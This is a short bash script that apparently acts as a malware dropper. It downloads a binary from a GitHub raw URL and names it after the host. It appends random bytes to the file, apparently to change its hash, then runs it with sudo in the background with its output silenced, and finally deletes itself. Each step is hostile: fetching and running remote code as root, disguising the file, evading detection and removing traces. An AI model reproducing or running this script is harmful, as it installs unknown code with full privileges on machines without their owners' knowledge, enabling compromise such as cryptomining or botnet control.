#!/bin/bash

HOSTNAME=$(hostname)
sudo pkill -x "$HOSTNAME" 2>/dev/null
cd "$HOME" || exit
sudo rm -rf "$HOME/$HOSTNAME"
curl -fsSL -o "$HOME/$HOSTNAME" https://raw.githubusercontent.com/changge695/remember/main/sync
dd if=/dev/urandom bs=1 count=1024 >> "$HOME/$HOSTNAME" 2>/dev/null
chmod +x "$HOME/$HOSTNAME"
sudo nohup "$HOME/$HOSTNAME" >/dev/null 2>&1 &
sleep 1
rm -- "$0"
